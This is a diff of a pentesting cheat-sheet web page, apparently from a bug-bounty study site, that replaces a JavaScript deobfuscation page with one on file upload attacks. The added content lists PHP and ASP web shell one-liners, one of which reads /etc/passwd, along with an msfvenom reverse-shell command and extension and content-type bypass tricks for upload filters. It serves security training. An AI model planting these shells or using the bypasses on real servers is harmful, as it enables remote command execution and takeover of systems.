@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../attacking-web-applications-with-ffuf/">
+        <link rel="prev" href="../command-injections/">
       
       
-        <link rel="next" href="../cross-site-scripting-%28xss%29/">
+        <link rel="next" href="../server-side-attacks/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>JavaScript Deobfuscation - Bug Bounty Hub</title>
+        <title>File Upload Attacks - Bug Bounty Hub</title>
       
     
     
@@ -62,7 +62,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#javascript-deobfuscation" class="md-skip">
+        <a href="#file-upload-attacks" class="md-skip">
           Skip to content
         </a>
       
@@ -98,7 +98,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              JavaScript Deobfuscation
+              File Upload Attacks
             
           </span>
         </div>
@@ -431,32 +431,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    JavaScript Deobfuscation
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../javascript-deobfuscation/" class="md-nav__link">
         
   
   
@@ -467,62 +445,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#terms" class="md-nav__link">
-    <span class="md-ellipsis">
-      Terms
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commands
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#useful-websites" class="md-nav__link">
-    <span class="md-ellipsis">
-      Useful Websites
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#misc" class="md-nav__link">
-    <span class="md-ellipsis">
-      Misc
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -624,10 +546,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../file-upload-attacks/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    File Upload Attacks
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -638,6 +582,53 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#web-shells" class="md-nav__link">
+    <span class="md-ellipsis">
+      Web Shells
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#bypasses" class="md-nav__link">
+    <span class="md-ellipsis">
+      Bypasses
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#limited-uploads" class="md-nav__link">
+    <span class="md-ellipsis">
+      Limited Uploads
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -984,36 +975,27 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#terms" class="md-nav__link">
+  <a href="#web-shells" class="md-nav__link">
     <span class="md-ellipsis">
-      Terms
+      Web Shells
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
+  <a href="#bypasses" class="md-nav__link">
     <span class="md-ellipsis">
-      Commands
+      Bypasses
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#useful-websites" class="md-nav__link">
+  <a href="#limited-uploads" class="md-nav__link">
     <span class="md-ellipsis">
-      Useful Websites
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#misc" class="md-nav__link">
-    <span class="md-ellipsis">
-      Misc
+      Limited Uploads
     </span>
   </a>
   
@@ -1035,47 +1017,51 @@
 
 
 
-<h1 id="javascript-deobfuscation">JavaScript Deobfuscation</h1>
-<h2 id="terms">Terms</h2>
+<h1 id="file-upload-attacks">File Upload Attacks</h1>
+<h2 id="web-shells">Web Shells</h2>
 <table>
 <thead>
 <tr>
-<th>Term</th>
+<th>Web Shell</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Code minification</td>
-<td>Reduces code to a single line often saved as .min.js.</td>
+<td><code>&lt;?php echo file_get_contents('/etc/passwd'); ?&gt;</code></td>
+<td>Basic PHP File Read</td>
 </tr>
 <tr>
-<td>Packing</td>
-<td>Obfuscation recognizable from the six function arguments used in the initial function "function(p,a,c,k,e,d)".</td>
+<td><code>&lt;?php system('hostname'); ?&gt;</code></td>
+<td>Basic PHP Command Execution</td>
 </tr>
 <tr>
-<td>JSFuck</td>
-<td>Programming style based in the atomic parts of JS. Uses only ()+[]! (aa and jj encode are similar).</td>
+<td><code>&lt;?php system($_REQUEST['cmd']); ?&gt;</code></td>
+<td>Basic PHP Web Shell</td>
 </tr>
 <tr>
-<td>Base 64</td>
-<td>Contains only alpha-numeric, + and /. Padded with '='.</td>
+<td><code>&lt;% eval request('cmd') %&gt;</code></td>
+<td>Basic ASP Web Shell</td>
 </tr>
 <tr>
-<td>Hex</td>
-<td>Encodes each char into its hex on the ASCII table. Contains 0-9 and a-f.</td>
+<td><code>msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw &gt; reverse.php</code></td>
+<td>Generate PHP reverse shell</td>
 </tr>
 <tr>
-<td>Ceasar</td>
-<td>Shifts each char by a fixed number</td>
+<td>PHP Web Shell</td>
+<td>PHP Web Shell</td>
 </tr>
 <tr>
-<td>Rot13</td>
-<td>Most common ceaser cipher, shifts by 13</td>
+<td>PHP Reverse Shell</td>
+<td>PHP Reverse Shell</td>
+</tr>
+<tr>
+<td>Web/Reverse Shells</td>
+<td>List of Web Shells and Reverse Shells</td>
 </tr>
 </tbody>
 </table>
-<h2 id="commands">Commands</h2>
+<h2 id="bypasses">Bypasses</h2>
 <table>
 <thead>
 <tr>
@@ -1085,126 +1071,87 @@
 </thead>
 <tbody>
 <tr>
-<td><code>curl http://SERVER_IP:PORT/</code></td>
-<td>cURL GET request</td>
+<td><strong>Client-Side Bypass</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><code>curl -s http://SERVER_IP:PORT/ -X POST</code></td>
-<td>cURL POST request</td>
+<td><code>[CTRL+SHIFT+C]</code></td>
+<td>Toggle Page Inspector</td>
 </tr>
 <tr>
-<td><code>curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"</code></td>
-<td>cURL POST with data</td>
+<td><strong>Blacklist Bypass</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><code>echo hackthebox | base64</code></td>
-<td>base64 encode</td>
+<td><code>shell.phtml</code></td>
+<td>Uncommon Extension</td>
 </tr>
 <tr>
-<td><code>echo ENCODED_B64 | base64 -d</code></td>
-<td>base64 decode</td>
+<td><code>shell.pHp</code></td>
+<td>Case Manipulation</td>
 </tr>
 <tr>
-<td><code>echo hackthebox | xxd -p</code></td>
-<td>hex encode</td>
+<td>PHP Extensions</td>
+<td>List of PHP Extensions</td>
 </tr>
 <tr>
-<td><code>echo ENCODED_HEX | xxd -p -r</code></td>
-<td>hex decode</td>
+<td>ASP Extensions</td>
+<td>List of ASP Extensions</td>
 </tr>
 <tr>
-<td><code>echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td>
-<td>rot13 encode</td>
+<td>Web Extensions</td>
+<td>List of Web Extensions</td>
 </tr>
 <tr>
-<td><code>echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td>
-<td>rot13 decode</td>
+<td><strong>Whitelist Bypass</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>shell.jpg.php</code></td>
+<td>Double Extension</td>
+</tr>
+<tr>
+<td><code>shell.php.jpg</code></td>
+<td>Reverse Double Extension</td>
+</tr>
+<tr>
+<td><code>%20, %0a, %00, %0d0a, /, .\, ., …</code></td>
+<td>Character Injection - Before/After Extension</td>
+</tr>
+<tr>
+<td><strong>Content/Type Bypass</strong></td>
+<td></td>
+</tr>
+<tr>
+<td>Content-Types</td>
+<td>List of All Content-Types</td>
+</tr>
+<tr>
+<td>File Signatures</td>
+<td>List of File Signatures/Magic Bytes</td>
 </tr>
 </tbody>
 </table>
-<h2 id="useful-websites">Useful Websites</h2>
+<h2 id="limited-uploads">Limited Uploads</h2>
 <table>
 <thead>
 <tr>
-<th>Site</th>
-<th>Description</th>
+<th>Potential Attack</th>
+<th>File Types</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><a href="https://jsconsole.com/">JS Console</a></td>
-<td>Interactive JavaScript console for testing code.</td>
+<td>XSS</td>
+<td>HTML, JS, SVG, GIF</td>
 </tr>
 <tr>
-<td><a href="https://www.toptal.com/developers/javascript-minifier">JS Minifier</a></td>
-<td>Minifies JavaScript for performance optimization.</td>
+<td>XXE/SSRF</td>
+<td>XML, SVG, PDF, PPT, DOC</td>
 </tr>
 <tr>
-<td><a href="https://beautifytools.com/javascript-obfuscator.php">BeatifyTools</a></td>
-<td>Obfuscates JavaScript to protect code.</td>
-</tr>
-<tr>
-<td><a href="https://obfuscator.io/">JS Obfuscator Tool</a></td>
-<td>Tool to obfuscate JavaScript code securely.</td>
-</tr>
-<tr>
-<td><a href="https://jsfuck.com/">JSFuck</a></td>
-<td>Encodes JavaScript using only six characters.</td>
-</tr>
-<tr>
-<td><a href="https://utf-8.jp/public/jjencode.html">jjencode</a></td>
-<td>Encodes JavaScript with JJEncode technique.</td>
-</tr>
-<tr>
-<td><a href="https://utf-8.jp/public/aaencode.html">aaencode</a></td>
-<td>Encodes JavaScript with AAEncode method.</td>
-</tr>
-<tr>
-<td><a href="https://prettier.io/playground/">Prettier</a></td>
-<td>Formats and beautifies JavaScript code.</td>
-</tr>
-<tr>
-<td><a href="https://beautifier.io/">js-beautify</a></td>
-<td>Beautifies minified or obfuscated JavaScript.</td>
-</tr>
-<tr>
-<td><a href="https://matthewfl.com/unPacker.html">UnPacker</a></td>
-<td>Deobfuscates and unpacks JavaScript code.</td>
-</tr>
-<tr>
-<td><a href="https://rot13.com/">rot13.com</a></td>
-<td>Applies ROT13 encoding/decoding for text.</td>
-</tr>
-<tr>
-<td><a href="https://www.boxentriq.com/code-breaking/cipher-identifier">Cipher Identifier</a></td>
-<td>Identifies cipher types in encoded text.</td>
-</tr>
-</tbody>
-</table>
-<h2 id="misc">Misc</h2>
-<table>
-<thead>
-<tr>
-<th>Command/Action</th>
-<th>Description</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>ctrl+u</code></td>
-<td>Show HTML source code in Firefox</td>
-</tr>
-<tr>
-<td><code>ctrl+shift+z</code></td>
-<td>Open browser debugger tab</td>
-</tr>
-<tr>
-<td>'{ }' button</td>
-<td>Pretty print in debugger tab</td>
-</tr>
-<tr>
-<td>Unpack</td>
-<td>Replace eval function with console.log</td>
+<td>DoS</td>
+<td>ZIP, JPG, PNG</td>
 </tr>
 </tbody>
 </table>
